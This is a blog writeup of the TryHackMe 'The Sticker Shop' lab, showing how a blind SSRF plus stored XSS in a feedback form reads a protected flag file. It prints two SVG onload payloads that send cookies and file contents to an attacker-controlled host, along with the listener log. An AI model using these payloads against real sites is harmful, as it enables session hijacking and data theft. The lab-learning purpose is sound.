<!doctype html><html lang=en prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# profile: http://ogp.me/ns/profile#"><head><base href=https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-sticker-shop/><title>Writeup: TryHackMe The Sticker Shop | aviskase</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta property="og:title" content="Writeup: TryHackMe The Sticker Shop"><meta name=twitter:title content="Writeup: TryHackMe The Sticker Shop"><meta property="og:description" content="
    
The Sticker Shop
Difficulty: easy
Platform: web

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!"><meta property="twitter:description" content="
    
The Sticker Shop
Difficulty: easy
Platform: web

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!"><meta name=description content="
    
The Sticker Shop
Difficulty: easy
Platform: web

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!"><meta property="og:url" content="https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-sticker-shop/"><link rel=canonical href=https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-sticker-shop/><meta property="og:type" content="article"><meta property="article:published_time" content="2025-05-02T13:54:38+00:00"><meta property="article:modified_time" content="2025-05-02T13:54:38+00:00"><meta property="og:site_name" content="aviskase"><meta property="article:author" content="https://www.aviskase.com/pages/about/"><meta name=twitter:card content="summary"><meta name=twitter:creator content="@aviskase"><link rel=me href=https://infosec.exchange/@aviskase><meta name=fediverse:creator content="@aviskase@infosec.exchange"><meta name=generator content="Hugo 0.147.3"><link rel=stylesheet href=/css/main.min.b63568c3305c9881a652d576d84e653067af3f52f79a9a4303ea2c5ea74cf65d.css integrity="sha256-tjVowzBcmIGmUtV22E5lMGevP1L3mppDA+osXqdM9l0="><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest></head><body><header><a href=/ class=title>aviskase</a><p><a href=/>Home</a>
<a href=/pages/about/>About</a>
<a href=/pages/archive/>Archive</a>
<a href=/feeds/all.atom.xml>RSS</a></p></header><main><div class=title><h1>Writeup: TryHackMe The Sticker Shop</h1></div><table class=article-props><tr><th class=width-min>published</th><td class=width-auto>2025-05-02</td></tr><tr><th class=width-min>reading&nbsp;time</th><td class=width-auto>2&nbsp;mins</td></tr><tr><th class=width-min>categories</th><td class=width-auto><a href=/categories/writeups/>writeups</a>, <a href=/categories/it/>it</a></td></tr></table><article><div class="callout info" role=note aria-label=Info><ul><li><a href=https://tryhackme.com/room/thestickershop class=external-link>The Sticker Shop</a></li><li>Difficulty: easy</li><li>Platform: web</li></ul><p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p><p>Can you read the flag at <code>http://MACHINE_IP:8080/flag.txt</code>?</p></div><p>Small room to practice web pentesting. Vulnerabilities explored:</p><ul><li>Server-Side Request Forgery</li><li>Cross-Site Scripting</li></ul><nav class="callout toc" aria-label="Table of Contents"><nav id=TableOfContents><ol><li><a href=#information-gathering>Information gathering</a></li><li><a href=#getting-flag-via-blind-ssrf--xss>Getting flag via blind SSRF + XSS</a></li></ol></nav></nav><h2 id=information-gathering><a href=#information-gathering>Information gathering</a></h2><p>Accessing <code>http://MACHINE_IP:8080/flag.txt</code> returns a 401 Unauthorized error.</p><p>Web app running on port 8080 has a feedback page at <code>http://MACHINE_IP:8080/submit_feedback</code>:</p><p><figure aria-label="screenshot of feedback page with input field"><img alt="screenshot of feedback page with input field" title="screenshot of feedback page with input field" width=651 height=415 srcset="/articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_469c2cacd78a48ae.webp 651w, /articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_ac20944ada80b660.webp 420w," sizes="(min-width: 800px) 50vw, 100vw" src=/articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_2c4e9eb6d3377820.jpg decoding=async loading=lazy></figure></p><p>Typically, information that something will be checked by the staff points to a potential attack vector.</p><h2 id=getting-flag-via-blind-ssrf--xss><a href=#getting-flag-via-blind-ssrf--xss>Getting flag via blind SSRF + XSS</a></h2><p>First, I confirmed that there is a XSS vulnerability by sending feedback with SVG pinging my server:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#cba6f7>svg</span><span style=color:#f38ba8>/</span><span style=color:#89b4fa>onload</span><span style=color:#89dceb;font-weight:700>=</span><span style=color:#a6e3a1>body.appendChild(document.createElement`script`).src=&#39;http://ATTACKER_IP:5000?c=&#39;+document.cookie</span> <span style=color:#89b4fa>hidden</span>/&gt;
</span></span></code></pre></div><p>My server got the ping, but it didn&rsquo;t contain cookies, which I thought I would use to access the flag resource from my side. So, I changed the payload to cause a blind SSRF, get the flag value on the user side, and send it to my server:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#cba6f7>svg</span> <span style=color:#89b4fa>onload</span><span style=color:#89dceb;font-weight:700>=</span><span style=color:#a6e3a1>&#34;fetch(&#39;http://MACHINE_IP:8080/flag.txt&#39;).then(response=&gt;response.text()).then(flag=&gt;{const s=document.createElement(&#39;script&#39;);s.src=&#39;http://ATTACKER_IP:5000?k=&#39;+encodeURIComponent(flag);document.body.appendChild(s)});&#34;</span> <span style=color:#89b4fa>hidden</span>&gt;&lt;/<span style=color:#cba6f7>svg</span>&gt;
</span></span></code></pre></div><p>Received flag is URL encoded, don&rsquo;t forget to decode it afterwards:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 -m http.server <span style=color:#fab387>5000</span>
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MACHINE_IP - - <span style=color:#89dceb;font-weight:700>[</span>07/Apr/2025 15:41:12<span style=color:#89dceb;font-weight:700>]</span> <span style=color:#a6e3a1>&#34;GET /?k=THM%7B83REDACTEDe6%7D HTTP/1.1&#34;</span> <span style=color:#fab387>200</span> -
</span></span></code></pre></div></article><nav class=article-nav aria-label="Post navigation"><span class=article-nav-old><a href=https://www.aviskase.com/articles/2025/05/01/writeup-tryhackme-epoch/ title="Writeup: TryHackMe Epoch" aria-label="Go to older post"><span class=arrow>◁</span>older</a>
</span><span class=article-nav-middle>&nbsp;&#183;&nbsp;&#183;&nbsp;&#183;&nbsp;</span>
<span class=article-nav-new><a href=https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-w1seguy/ title="Writeup: TryHackMe W1seGuy" aria-label="Go to newer post">newer<span class=arrow>▶</span></a></span></nav></main><footer><span>2025</span><a href=https://infosec.exchange/@aviskase rel=me aria-label="Visit my Mastodon profile"><svg role="img" height="24" viewBox="0 0 24 24" width="24"><title>Mastodon</title><desc>An icon representing the Mastodon social network</desc><path d="m20.94 14c-.28 1.41-2.44 2.96-4.97 3.26-1.31.15-2.6.3-3.97.24-2.25-.11-4-.54-4-.54v.62c.32 2.22 2.22 2.35 4.03 2.42 1.82.05 3.44-.46 3.44-.46l.08 1.65s-1.28.68-3.55.81c-1.25.07-2.81-.03-4.62-.5-3.92-1.05-4.6-5.24-4.7-9.5l-.01-3.43c0-4.34 2.83-5.61 2.83-5.61C6.95 2.3 9.41 2 11.97 2h.06c2.56.0 5.02.3 6.47.96.0.0 2.83 1.27 2.83 5.61.0.0.04 3.21-.39 5.43M18 8.91c0-1.08-.3-1.91-.85-2.56-.56-.63-1.3-.96-2.23-.96-1.06.0-1.87.41-2.42 1.23l-.5.88-.5-.88c-.56-.82-1.36-1.23-2.43-1.23-.92.0-1.66.33-2.23.96C6.29 7 6 7.83 6 8.91v5.26h2.1V9.06c0-1.06.45-1.62 1.36-1.62 1 0 1.5.65 1.5 1.93v2.79h2.07V9.37c0-1.28.5-1.93 1.51-1.93.9.0 1.35.56 1.35 1.62v5.11H18z"/></svg></a>
<a href=mailto:aviskase@gmail.com>Yuliya Bagriy</a><a href=https://www.aviskase.com/pages/i-dont-track-you/>No tracking</a></footer></body></html>